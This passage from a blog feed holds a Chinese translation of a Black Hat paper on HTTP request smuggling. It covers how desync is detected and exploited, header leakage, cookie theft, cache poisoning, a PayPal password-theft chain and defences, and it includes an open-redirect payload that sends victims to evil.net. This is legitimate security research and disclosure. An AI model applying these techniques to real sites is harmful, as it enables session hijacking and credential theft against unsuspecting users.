href="https://www.cnblogs.com/pycode/p/9495808.html" target="_blank" rel="noopener">https://www.cnblogs.com/pycode/p/9495808.html</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从一次漏洞挖掘入门ldap注入&quot;&gt;&lt;a href=&quot;#从一次漏洞挖掘入门ldap注入&quot; class=&quot;headerlink&quot; title=&quot;从一次漏洞挖掘入门ldap注入&quot;&gt;&lt;/a&gt;从一次漏洞挖掘入门ldap注入&lt;/h1&gt;&lt;p&gt;原文首发于先知:&lt;a href=&quot;h
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>HTTP Desync Attacks-Smashing into the Cell Next Door</title>
    <link href="https://hpdoger.cn/2019/08/10/HTTP%20Desync%20Attacks-Smashing%20into%20the%20Cell%20Next%20Door/"/>
    <id>https://hpdoger.cn/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/</id>
    <published>2019-08-09T16:00:00.000Z</published>
    <updated>2019-08-21T07:50:23.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door"><a href="#HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door" class="headerlink" title="HTTP Desync Attacks-Smashing into the Cell Next Door"></a>HTTP Desync Attacks-Smashing into the Cell Next Door</h1><p>文章转载议题:<a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)" target="_blank" rel="noopener">https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)</a></p><p>James Kettle - <a href="mailto:james.kettle@portswigger.net" target="_blank" rel="noopener">james.kettle@portswigger.net</a> - @albinowax</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>传统上，HTTP请求被视为独立的独立实体。在本文中，我将探讨一种远程、未经身份验证的攻击者能够打破这种隔离并将其请求转接到其他人身上的技术。通过这种技术，我可以在众多商业和军事系统的WEB基础应用上扮演一位操作者，在他们的虚拟环境中使用漏洞，并且在bug bounties中获得超过6万美元</p><p>将这些目标作为案例研究，我将向您展示如何巧妙地修改受害者的请求，以将其路由到恶意领域，调用有害的响应。我还将演示在您自己的请求中使用后端重组，攻击基于前端的各种信任，获得对内部API的最大特权访问，投毒Web缓存，并危及paypal的登录页面。</p><p>HTTP Request Smuggling(后文称为请求走私)最初是由WatchFire1于2005年记录下来的，但由于其困难和附带损害的可怕名声，使得当Web服务的敏感性增常期间，它大多被忽视。除了新的攻击变种和利用途径之外，我将帮助您使用定制的开源工具和一种改进的方法来处理这一遗留问题，以最小的风险进行可靠的黑盒检测、评估和利用</p><h2 id="Core-concepts"><a href="#Core-concepts" class="headerlink" title="Core concepts"></a>Core concepts</h2><p>自HTTP/1.1以来，通过一个底层TCP或SSL/TLS套接字发送多个HTTP请求被广泛支持。这个协议非常简单——HTTP请求只需背靠背地放置，服务器解析报头就可以知道每个报头的结束位置和下一个报头的开始位置。这经常与HTTP pipeline2混淆，后者是少见的类型，在本文的攻击描述中不予介绍。</p><p>这本身是无害的。然而，现代网站是由一系列的系统组成的，都是通过HTTP进行对话的。此多层体系结构接收来自多个不同用户的HTTP请求，并通过单个TCP/TLS连接将其路由：<br><img src="http://static.zybuluo.com/1160307775/5zcoyljdq16xzvsz5wbnna62/image_1dhtfhnrdqvspfo15j4no1tuqp.png" alt="image_1dhtfhnrdqvspfo15j4no1tuqp.png-22.8kB"></p><p>这意味着，后端与前端关于“每条消息在哪里结束”达成一致是至关重要的。否则，攻击者可能会发送一条不明确的消息，使后端将其解释为两个不同的HTTP请求</p><p><img src="http://static.zybuluo.com/1160307775/ornlfq2wbqh1jf5r7dzed55y/image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png" alt="image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png-26kB"></p><p>这使攻击者能够在下一个合法用户请求开始时预先处理任意内容。在本文中，走私内容将被称为“前缀”，并以橙色突出显示。</p><p>让我们假设前端浏览器优先处理第一个内容长度头，后端优先处理第二个内容长度头。从后端的角度来看，TCP流可能看起来像：</p><p><img src="http://static.zybuluo.com/1160307775/m2v46k8ligt8vtjxbvzvcdck/image_1dhtg6sgu16rlhn09bi1779smo3q.png" alt="image_1dhtg6sgu16rlhn09bi1779smo3q.png-21.7kB"></p><p>在引擎中，前端浏览器将蓝色和橙色数据转发到后端，后端在发出响应之前只读取蓝色内容。这使得后端套接字受到橙色数据的污染。当合法的绿色请求到达时，它最终附加到橙色内容上，导致意外的响应。</p><p>在这个例子中，注入的“G”会破坏绿色用户的请求，他们可能会得到“未知方法GPOST”的响应。</p><p>本文中的每个攻击都遵循这个基本格式。WatchFire论文描述了一种称为“反向请求走私”的替代方法，但这依赖于前端和后端系统之间的管道连接，因此很少有选择。</p><p>在现实生活中，双content-length技术很少起作用，因为许多系统明智地拒绝具有多个内容长度头的请求。相反，我们将使用分块编码攻击系统-这次我们利用RFC2616规范：</p><p><strong>如果接收的消息同时包含传输编码头字段和内容长度头字段，则必须忽略后者</strong></p><p>由于规范默许使用传输编码（分块编码和内容长度）处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，从一个服务器上将传输编码头隐藏在一个链中的时，它将返回到使用内容长度，并且我们可以取消整个系统的同步。</p><p>您可能不太熟悉分块编码，因为像Burp Suite这样的工具会自动将分块的请求/响应缓冲到常规消息中，以便于编辑。在分块的消息中，正文由0个或多个分块组成。每个块由块大小、换行符和块内容组成。消息以0大小的块终止。以下是使用分块编码进行的简单失步攻击：</p><p><img src="http://static.zybuluo.com/1160307775/re8piqva834m983ljgcg4sh9/image_1dhthci68dal13houlsiv8brk47.png" alt="image_1dhthci68dal13houlsiv8brk47.png-22.3kB"></p><p>我们没有在这里隐藏传输编码头，因此此漏洞主要适用于前端根本不支持分块编码的系统，这在使用内容交付网络Akamai的许多网站上都可以看到。</p><p>如果后端不支持分块编码，我们需要翻转偏移量：<br><img src="http://static.zybuluo.com/1160307775/41818gek0g1258ed5ud1uz9d/image_1dhthmclj6hn11mehtq1ko2ikn4k.png" alt="image_1dhthmclj6hn11mehtq1ko2ikn4k.png-24.6kB"></p><p>这种技术在相当多的系统上都起作用，但是我们可以通过使传输编码头稍微难以被发现来利用更多的资源，这样一个系统就看不到它。这可以通过使用服务器的HTTP解析中的差异来实现。下面是一些只有部分服务识别传输编码的请求示例：分块头。在本研究中，每个都成功地用于攻破至少一个系统：</p><p><img src="http://static.zybuluo.com/1160307775/qzi15zyia3alxga9sragpspx/image_1dhtj1skk1mim1naa1l2a1toq1ig051.png" alt="image_1dhtj1skk1mim1naa1l2a1toq1ig051.png-52kB"></p><p>如果前端和后端服务器都有这些处理，那么每个处理都是无害的，否则都是一个重大威胁。有关更多技术，请查看Regilero正在进行的research4.。我们稍后将使用其他技术查看实际示例。</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>请求走私背后的理论是直截了当的，但是不受控制变量的数量和我们对前端所发生事情的完全不了解会导致复杂的情况。</p><p>我已经开发了应对这些挑战的技术和工具，并将它们组合成以下简单的方法，我们可以利用这些方法来追查请求的走私漏洞并证明其影响：<br><img src="http://static.zybuluo.com/1160307775/4avwsjuodz5s97mcmuq4ql8c/image_1dhtjaght12mlo3grs1q0rtko5e.png" alt="image_1dhtjaght12mlo3grs1q0rtko5e.png-19.7kB"></p><h2 id="Detect"><a href="#Detect" class="headerlink" title="Detect"></a>Detect</h2><p>检测请求走私漏洞的明显方法是发出一个含糊不清的请求，然后发出一个正常的“受害者”请求，然后观察后者是否得到意外的响应。但是，这极易受到干扰；如果另一个用户的请求在受害者请求之前击中中毒的套接字，那么他们将得到损坏的响应，我们将不会发现该漏洞。这意味着，在流量很大的网站，如果不在过程中利用大量用户去测试，就很难证明存在<strong>请求走私</strong>漏洞。即使在没有其他流量的站点上，您也会面临应用程序级异常终止连接所导致的错误否定的风险。</p><p>为了解决这个问题，我开发了一种检测策略，它使用一系列消息，使得易受攻击的后端系统挂起并超时连接。这种技术几乎没有误报，可以抵抗应用程序级的行为从而导致的误报，最重要的是，它几乎没有影响其他用户的风险。</p><p>假设前端服务器使用Content-Length头，后端使用Transfer-Encoding头。我简称这个目标为cl.te。我们可以通过发送以下请求来检测潜在的请求走私：</p><p><img src="http://static.zybuluo.com/1160307775/15im6vs0brbtf61gd6zm1jv6/image_1dhtjsm7t4jo1tun14v4a174ri5r.png" alt="image_1dhtjsm7t4jo1tun14v4a174ri5r.png-17.5kB"></p><p>由于内容长度较短，前端将只转发蓝色文本，后端将在等待下一个块大小时超时。这将导致可观察到的时间延迟。</p><p>如果两个服务器都是同步的（te.te或cl.cl），则前端将拒绝该请求，或者两个系统都将无害地处理该请求。最后，如果从另一个角度（te.cl）执行去同步，由于块大小“q”无效，前端将拒绝消息而不将其转发到后端。这可以防止后端套接字中毒。</p><p>我们可以使用以下请求安全地检测te.cl去同步：<br><img src="http://static.zybuluo.com/1160307775/fvkyn0yeyjzy0pff2in1qg4u/image_1dhtk3jth1s2k11e51o9h15291qqh68.png" alt="image_1dhtk3jth1s2k11e51o9h15291qqh68.png-17.4kB"></p><p>由于“0”分块的终止，前端将只转发蓝色文本，后端将超时等待X到达。</p><p>如果Desync以另一种方式发生（cl.te），那么这种方法将使用”X”毒害后端套接字，可能会危害合法用户。幸运的是，通过始终运行首先检测方法，我们可以排除这种可能性。</p><p>这些请求可以针对头解析中的任意差异进行调整，并用于通过取消Desynchronize5自动识别请求走私漏洞-一个开发用于帮助此类攻击的开源Burp Suite 扩展。它们现在也用于Burp Suite的scanner。尽管这是一个服务器级的漏洞，但单个域上的不同端点通常路由到不同的目标，因此该技术应单独应用于每个端点。</p><h2 id="Confirm"><a href="#Confirm" class="headerlink" title="Confirm"></a>Confirm</h2><p>在这一点上，您已经尽了最大努力，而不会给其他用户带来副作用的风险。然而，许多客户不愿意在没有进一步证据的情况下认真对待报告，所以这就是我们将要克服的。证明请求走私的全部危害的下一步是证明后端套接字中毒是可能的。为此，我们将发出一个旨在毒害后端套接字的请求，然后发出一个希望成为毒害受害者的请求，明显地改变了响应。</p><p>如果第一个请求导致错误，后端服务器可能会决定关闭连接，丢弃中毒缓冲区并破坏攻击。尝试通过将设计用于接受POST请求的端点作为目标，并保留任何预期的GET/POST参数来避免这种情况。</p><p>有些站点有多个不同的后端系统，前端查看每个请求的方法、URL和头，以决定将其路由到何处。如果受害者请求路由到与攻击请求不同的后端，那么攻击将失败。因此，“攻击”和“受害者”请求最初应尽可能相似。</p><p>如果目标请求看起来像：<br><img src="http://static.zybuluo.com/1160307775/988vcjqwqvtxw9bigenwnjv3/image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png" alt="image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png-23.2kB"></p><p>那么，一次CL.TE毒害攻击尝试看起来像是：<br><img src="http://static.zybuluo.com/1160307775/xogz4l7vzvbexan7rd1f1fdv/image_1dhv465pn1if7lah1iqrh5st572.png" alt="image_1dhv465pn1if7lah1iqrh5st572.png-43.3kB"></p><p>如果攻击成功，受害者请求（绿色）将得到404响应。</p><p>te.cl攻击看起来很相似，但是需要一个封闭块，这意味着我们需要自己指定所有的头，并将受害者请求放在正文中。确保前缀中的内容长度略大于正文：</p><p><img src="http://static.zybuluo.com/1160307775/nr7oeij645povxo3wrvdcdrh/image_1dhv4boe01rjp1s361dut1c8o8aj7f.png" alt="image_1dhv4boe01rjp1s361dut1c8o8aj7f.png-59.1kB"></p><p>如果一个站点是运行的，另一个用户的请求可能会击中您之前投毒的套接字，这将使您的攻击失败，并可能使用户不安。因此，此过程通常需要进行几次尝试，在高流量站点上可能需要数千次尝试。所以请谨慎和克制行为</p><h2 id="Explore"><a href="#Explore" class="headerlink" title="Explore"></a>Explore</h2><p>我将使用一系列真实的网站演示其余的方法。像往常一样，我专门针对那些明确表示愿意通过运行bug奖励计划与安全研究人员合作的公司。多亏了大量涌现的私人程序和不打补丁的习惯，我不得不编写很多案例。在明确声明网站的地方，请记住，它们是少数能够抵御这种攻击的安全网站之一。</p><p>现在我们已经确定套接字投毒是可能的，下一步是收集信息，这样我们就可以发动一次全面的攻击。</p><p>前端通常会附加和重写HTTP请求头，如x-forwarded-host和x-forwarded-for，以及许多经常难以猜测名称的自定义头。我们的走私请求可能缺少这些头，这可能导致意外的应用程序行为和失败的攻击。</p><p>幸运的是，有一个简单的策略另辟蹊径，并且可以看到这些隐藏的header头。这使得我们可以通过手动添加头来恢复功能，甚至可以启用进一步的攻击。</p><p>只需在目标应用程序上查找一个反射post参数的页面，对参数进行无序排列，使反射的参数排列最后，稍微增加内容长度，然后将生成的请求进行走私：<br><img src="http://static.zybuluo.com/1160307775/4ie737yk1pu8d49dpv11lrrp/image_1dhvv1j72jm7qdm132e1ekoaim7s.png" alt="image_1dhvv1j72jm7qdm132e1ekoaim7s.png-54.9kB"></p><p>绿色请求将在其到达login[email]参数之前由前端重写，因此当它被反射回来时，将泄漏所有内部头：</p><p><img src="http://static.zybuluo.com/1160307775/pe2e05lr18lvcyjofytq9j7p/image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png" alt="image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png-45.5kB"></p><p>通过增加Content-Length头，您可以逐步检索更多信息，直到您试图读取超过受害者请求末尾的内容，并且受害者的请求会超时。</p><p>有些系统完全依赖于前端系统的安全性，一旦您bypass，您就可以直接为所欲为。在login.new relic.com上，“后端”系统是反代的，因此更改走私的主机头授予我访问不同的新relic系统的权限。最初，我访问的每个内部系统都认为我的请求是通过HTTP发送的，并以重定向方式响应的：</p><p><img src="http://static.zybuluo.com/1160307775/h3bs3zziu7yq9f3ltsxga4y1/image_1dhvvp3og1rod1iu28cetojpb59m.png" alt="image_1dhvvp3og1rod1iu28cetojpb59m.png-22.2kB"></p><p>使用前面观察到的x-forwarded-proto头很容易修复：<br><img src="http://static.zybuluo.com/1160307775/1sy6c955n8mv6iou1qbmcxde/image_1dhvvq6j81n781hslpqtel1o38a3.png" alt="image_1dhvvq6j81n781hslpqtel1o38a3.png-24.7kB"></p><p>通过一些目录，我在目标上找到了一个有用的端点：<br><img src="http://static.zybuluo.com/1160307775/7s94vz15z04k0rj1rk1elzvj/image_1dhvvt1km1bb81cd82bou11aufag.png" alt="image_1dhvvt1km1bb81cd82bou11aufag.png-25.3kB"></p><p>错误消息清楚地告诉我需要某种类型的授权头，但却没有告诉我字段名。我决定尝试前面看到的“x-nr-external-service”头段：<br><img src="http://static.zybuluo.com/1160307775/sfiuf8gboh57gq3ltxtm6ne8/image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png" alt="image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png-29.4kB"></p><p>不幸的是，这不起作用——它导致了我们在直接访问该URL时已经看到的相同的禁止响应。这表明前端正在使用x-nr-external-service头来指示请求来自Internet，通过走私因此丢失请求头，我们已经诱使系统认为我们的请求来自内部。这是非常有意义的，但没有直接的用处——我们仍然需要缺少的授权头的名称。</p><p>此时，我可以将已处理的请求反射技术应用到一系列端点，直到找到一个具有正确请求头的端点。相反，我决定从上一次我的New Relic6中查询一些笔记，这显示了两个非常宝贵的报头-Server-Gateway-Account-Id and Service- Gateway-Is-Newrelic-Admin。使用这些工具，我可以获得对其内部API的完全管理级访问：<br><img src="http://static.zybuluo.com/1160307775/cj5947kaur85xykxf7725ym6/image_1di00ssli1mfu1381nml92h1mn4ba.png" alt="image_1di00ssli1mfu1381nml92h1mn4ba.png-78.4kB"></p><p>New Relic部署了一个修补程序，并将根本原因诊断为F5网关中的一个弱点。据我所知，没有可用的补丁，这意味着在写作的时候这仍然是0day。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>直接进入内部API确实不错，但它很少是我们唯一的选择。我们还可以针对浏览目标网站的每个人发起大量不同的攻击。</p><p>要确定哪些攻击可以应用到其他用户，我们需要了解哪些类型的请求可以被破坏。从“确认”阶段重复套接字中毒测试，但反复调整“受害者”请求，直到它类似于典型的GET请求。您可能会发现，您只能使用某些方法、路径或头毒害请求。另外，尝试从不同的IP地址发出受害者请求-在极少数情况下，您可能会发现您只能对来自同一IP的请求进行毒害。</p><p>最后，检查网站是否使用Web缓存-这些可以帮助绕过许多限制，增加我们对哪些资源中毒的控制，并最终增加请求走私漏洞的严重性。</p><h3 id="Store"><a href="#Store" class="headerlink" title="Store"></a>Store</h3><p>如果应用程序支持编辑或存储任何类型的文本数据，那么利用就非常容易。通过在受害者的请求前加上一个精心设计的存储请求，我们可以让应用程序保存他们的请求并将其显示给我们，然后窃取任何身份验证cookie/headers。下面是一个以Trello为目标的示例，使用其配置文件编辑端点：</p><p><img src="http://static.zybuluo.com/1160307775/txwaqf2l9ruc7nv89gyxljog/image_1di01d7421dui1a81nbepu2btbn.png" alt="image_1di01d7421dui1a81nbepu2btbn.png-54.1kB"></p><p>一旦受害者的请求到达，它就会保存在我的个人资料中，暴露他们所有的头和cookie：</p><p><img src="http://static.zybuluo.com/1160307775/2622oq8b4q8yery1kpm2s8jw/image_1di01e9oa1c4s19e513t9p564a8c4.png" alt="image_1di01e9oa1c4s19e513t9p564a8c4.png-48.7kB"></p><p>使用这种技术的唯一主要目的是丢失“&amp;”之后发生的任何数据，这使得从表单编码的post请求中窃取主体很困难。我花了一段时间试图通过使用可选的请求编码来解决这个限制，最终放弃了，但我仍然怀疑这是可能的。</p><p>数据存储的机会并不总是如此明显——在另一个网站上，我可以使用“联系我们”表单，最终触发一封包含受害者请求的电子邮件，并获得2500美元的额外收入。</p><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>能够将一个任意前缀应用到其他人的响应中，也打开了另一种攻击途径——触发一个有害的响应。</p><p>使用有害反应有两种主要方法。最简单的方法是发出“攻击”请求，然后等待其他人的请求击中后端套接字并触发有害响应。一种更为棘手但更强大的方法是亲自发出“攻击”和“受害者”请求，并希望对受害者请求的有害响应通过Web缓存保存，并提供给访问同一URL的任何其他人-Web缓存中毒。</p><p>在以下每个请求/响应片段中，黑色文本是对第二个（绿色）请求的响应。第一个（蓝色）请求的响应被忽略，因为它不相关。</p><h2 id="Upgrading-XSS"><a href="#Upgrading-XSS" class="headerlink" title="Upgrading XSS"></a>Upgrading XSS</h2><p>在审计一个SaaS应用程序时，Param Miner7发现了一个名为saml的参数，Burp scaner证实它易受反射XSS的攻击。反射式XSS本身不错，但在规模上很难利用，因为它需要用户交互。</p><p>通过请求走私，我们可以对主动浏览网站的随机用户提供包含XSS的响应，从而实现直接的大规模利用。我们还可以访问authentication headers 和仅HTTP cookie，这可能会让我们转到其他域。</p><p><img src="http://static.zybuluo.com/1160307775/l8sr33d0y8t306l6qx5higvw/image_1di01r6qa1iap8ki1vh0gdg17s9d1.png" alt="image_1di01r6qa1iap8ki1vh0gdg17s9d1.png-70.8kB"></p><h2 id="Grasping-the-DOM"><a href="#Grasping-the-DOM" class="headerlink" title="Grasping the DOM"></a>Grasping the DOM</h2><p>在<a href="http://www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：" target="_blank" rel="noopener">www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：</a><br><img src="http://static.zybuluo.com/1160307775/xu9tr6kxrkzl7m0t2uvwdlrs/image_1di01vv584rumq9d5r1ormld2de.png" alt="image_1di01vv584rumq9d5r1ormld2de.png-34.5kB"></p><p>页面上的一些javascript正在从受害者浏览器的查询字符串中读取“redir”参数，但我如何控制它？请求走私使我们能够控制服务器认为查询字符串是什么，但是受害者的浏览器对查询字符串的认知只是了解用户试图访问哪个页面。</p><p>我可以通过链接服务器端的非开放重定向来解决这个问题：</p><p><img src="http://static.zybuluo.com/1160307775/klj8f2y8p7hgayr8jvzphtkn/image_1di025q9518k91g5dh8drkna2feb.png" alt="image_1di025q9518k91g5dh8drkna2feb.png-70.3kB"></p><p>受害者浏览器将收到一个301重定向到<a href="https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。" target="_blank" rel="noopener">https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。</a></p><h2 id="CDN-Chaining"><a href="#CDN-Chaining" class="headerlink" title="CDN Chaining"></a>CDN Chaining</h2><p>有些网站使用多层反向代理和cdn。这给了我们额外的机会去同步，这是一直被赞赏的，它也经常增加严重性</p><p>一个目标是不知何故地使用两层Akamai，尽管服务器由同一供应商提供，但仍有可能将它们不同步，因此，在受害者网站的Akamai network中提供不同的内容：<br><img src="http://static.zybuluo.com/1160307775/oy6dcrszjf3k5nzxie51n427/image_1di02gpq91n7jc93pii6hsvseo.png" alt="image_1di02gpq91n7jc93pii6hsvseo.png-45.2kB"></p><p>同样的概念也适用于SaaS提供商——我能够攻破一个建立在知名SaaS平台上的关键网站，将请求定向到建立在同一平台上的不同系统。</p><h2 id="‘Harmless’-responses"><a href="#‘Harmless’-responses" class="headerlink" title="‘Harmless’ responses"></a>‘Harmless’ responses</h2><p>因为请求走私让我们影响对任意请求的响应，一些通常无害的行为成为可利用的。例如，即使是不起眼的开放式重定向，也可以通过将javascript导入重定向到恶意域来危害帐户。</p><p>使用307代码的重定向特别有用，因为在发出post请求后接收307的浏览器将把post重新发送到新的目的地。这可能意味着你可以让不知情的受害者直接将他们的明文密码发送到你的网站。</p><p>经典的开放式重定向本身就很常见，但是有一种变体在Web中普遍存在，因为它源于Apache和IIS中的默认行为。它很方便地被认为是无害的，被几乎所有人忽视，因为没有像请求走私这样的伴随的弱点，它确实是无用的。如果尝试访问没有尾随斜杠的文件夹，服务器将使用主机头中的主机名进行重定向以附加斜杠：<br><img src="http://static.zybuluo.com/1160307775/fpic6gjvppuog2tlgow0f4gl/image_1di033eund4netio7jsa3nf4f5.png" alt="image_1di033eund4netio7jsa3nf4f5.png-44.4kB"></p><p>使用此技术时，请密切关注重定向中使用的协议。您可以使用像x-forwarded-ssl这样的头来影响它。如果它卡在HTTP上，而您攻击的是一个HTTPS站点，那么受害者的浏览器将由于其混合内容保护而阻止连接。有两个已知的例外8-可以完全绕过Internet Explorer的混合内容保护，如果重定向目标在其HSTS缓存中，Safari将自动升级到HTTPS的连接。</p><h2 id="Web-Cache-Poisoning"><a href="#Web-Cache-Poisoning" class="headerlink" title="Web Cache Poisoning"></a>Web Cache Poisoning</h2><p>在尝试对特定网站进行基于重定向的攻击几个小时后，我在浏览器中打开了他们的主页以查找更多的攻击面，并在Dev控制台中发现了以下错误：</p><p><img src="http://static.zybuluo.com/1160307775/b8jv6t5emd2ty057r7njho6u/image_1di037a5k1iq51f7a19n51jmc600fi.png" alt="image_1di037a5k1iq51f7a19n51jmc600fi.png-18.5kB"></p><p>无论从哪台机器加载网站，都会发生此错误，并且IP地址看起来非常熟悉。在我的重定向探测期间，在我的受害者请求之前，有人请求了一个图像文件，而中毒的响应被缓存保存了下来。</p><p>这是对潜在影响的一个很好的证明，但总的来说并不是一个理想的结果。除了依赖基于超时的检测，没有办法完全消除意外缓存中毒的可能性。也就是说，为了将风险降到最低，你可以：<br>-确保“受害者”请求有一个缓存阻止程序。</p><p>-使用turbo Intruder，尽快发送“受害者”请求。<br>-尝试创建一个前缀来触发反缓存头的响应，或者一个不太可能被缓存的状态代码。<br>-在不常用的前端处实施攻击。</p><h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception++"></a>Web Cache Deception++</h2><p>如果我们不尝试减少攻击者/用户混合响应缓存的机会，而是接受它呢？</p><p>我们可以尝试用受害者的cookie获取包含敏感信息的响应，而不是使用设计用于导致有害响应的前缀：<br><img src="http://static.zybuluo.com/1160307775/n6jss7idvvrs8bz0933pb08e/image_1di03lb12var1itka221437galfv.png" alt="image_1di03lb12var1itka221437galfv.png-24.3kB"></p><p>前端请求：<br><img src="http://static.zybuluo.com/1160307775/rr9iwmh76f9jexgwfedovzyu/image_1di03ot516ne1j91u041oh61tu5gs.png" alt="image_1di03ot516ne1j91u041oh61tu5gs.png-13.1kB"></p><p>当用户对静态资源的请求到达中毒的套接字时，响应将包含其帐户详细信息，并且缓存将通过静态资源保存这些信息。然后，我们可以通过从缓存中加载/static/site.js来检索帐户详细信息。</p><p>这实际上是Web缓存欺骗攻击的一个新变体。它在两个关键方面更强大——它不需要任何用户交互，也不需要目标站点允许您使用扩展。唯一的陷阱是攻击者无法确定受害者的反应将落在何处。</p><h2 id="PayPal"><a href="#PayPal" class="headerlink" title="PayPal"></a>PayPal</h2><p>由于请求走私连锁缓存中毒，我能够持续劫持众多JavaScript文件，其中之一是在Paypal的登录页面：<a href="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" target="_blank" rel="noopener">https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js</a>.</p><p><img src="http://static.zybuluo.com/1160307775/wmoqtjprhf707is1xo7ka1ka/image_1di03u9lu1fb2tur1n51ekl9loh9.png" alt="image_1di03u9lu1fb2tur1n51ekl9loh9.png-61.8kB"></p><p>但是有一个问题——PayPal的登录页面使用了<code>script-src</code>的csp，它破坏了我的重定向。<br><img src="http://static.zybuluo.com/1160307775/cpxwv9v85x5usy6th6jdwu98/image_1di040r7764spvs1orqvbk96rhm.png" alt="image_1di040r7764spvs1orqvbk96rhm.png-23.4kB"></p><p>起初，这看起来像是纵深防御的胜利。但是，我注意到登录页面在一个动态生成的iframe中加载了c.paypal.com上的一个子页面。此子页没有使用CSP，还导入了我们的有害JS文件。这使我们完全控制了iframe的内容，但是由于同源策略，我们仍然无法从父页面读取用户的Paypal密码。</p><p><img src="http://static.zybuluo.com/1160307775/dkyfc1gj4hzy6ihqaqc20wbx/image_1di0433272ms1vie1ond1n1p1eqqi3.png" alt="image_1di0433272ms1vie1ond1n1p1eqqi3.png-40.2kB"></p><p>我的同事GarethHeyes随后在paypal.com/us/gifts上发现了一个不使用CSP的页面，并导入了我们中毒的JS文件。通过使用我们的JS重定向c.paypal.com iframe到该URL（并在第三次触发我们的JS），我们最终可以从使用Safari或IE登录的所有人访问父和窃取明文Paypal密码。<br><img src="http://static.zybuluo.com/1160307775/kgm49hw0deq81v5z9k90qsyo/image_1di0462kcnfm1ik4v7v19q81ue0ig.png" alt="image_1di0462kcnfm1ik4v7v19q81ue0ig.png-68.3kB"></p><p>PayPal通过配置Akamai拒绝包含传输编码的请求：chunked header，快速地解决了这个漏洞，并授予了18900美元的赏金。</p><p>几周后，在发明和测试一些新的去同步技术时，我决定尝试使用一个换行的头文件：<br><img src="http://static.zybuluo.com/1160307775/bsi9yau5mqmjou0cgxvas5iv/image_1di048085cfbp1e3b1hmeeddit.png" alt="image_1di048085cfbp1e3b1hmeeddit.png-5.3kB"></p><p>这似乎使转移编码头对于Akamai来说不可见，成功绕过，并再次授予我控制Paypal的登录页面。PayPal迅速应用了一个更稳健的解决方案，并获得了令人印象深刻的20000美元。(译者跪了2333)</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>另一个目标使用了反向代理链，其中一个没有将’\n’视为有效的头终止符。这意味着他们的网络基础设施中相当大的一部分容易受到走私请求的攻击。我录制了一个演示，演示如何使用非同步来有效地识别和利用Bugzilla安装的副本上的漏洞，该副本包含一些非常敏感的信息。</p><p>您可以在本白皮书的在线版本<a href="https://portswigger.net/blog/http-desync-attacks9中找到该视频。" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks9中找到该视频。</a></p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><p>像往常一样，安全很简单。如果您的网站没有负载均衡器、cdn和反向代理，那么这种技术就不是一种威胁。引入的层越多，就越容易受到攻击。</p><p>每当我讨论攻击技术时，我都会被问到HTTPS是否可以阻止它。一如既往，答案是“不”。也就是说，通过将前端服务器配置为专门使用HTTP/2与后端系统通信，或者完全禁用后端连接重用，可以解决此漏洞的所有变体。或者，您可以确保链中的所有服务器使用相同的配置运行相同的Web服务器软件。</p><p>可以通过重新配置前端服务器来解决此漏洞的特定实例，以便在继续路由之前将不明确的请求规范化。对于不想让客户受到攻击的客户来说，这可能是唯一现实可行的解决方案，CloudFlare和Fastly似乎成功地应用了它。</p><p>对于后端服务器来说，正常化请求不是一个选项——它们需要彻底拒绝不明确的请求，并删除关联的连接。由于拒绝请求比简单地使其正常化更可能影响合法流量，因此我建议重点防止通过前端服务器进行请求走私。</p><p>当你的工具对你不利时，有效的防御是不可能的。大多数Web测试工具在发送请求时都会自动“更正”内容长度头段，从而使请求无法走私。在BurpSuite中，您可以使用Repeater menu禁用此行为-确保您选择的工具具有同等的功能。此外，某些公司和bug赏金平台通过Squid之类的代理来转发测试人员的流量，以便进行监控。这些将管理测试人员发起的任何请求走私攻击，确保公司对该漏洞类的覆盖率为零。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" 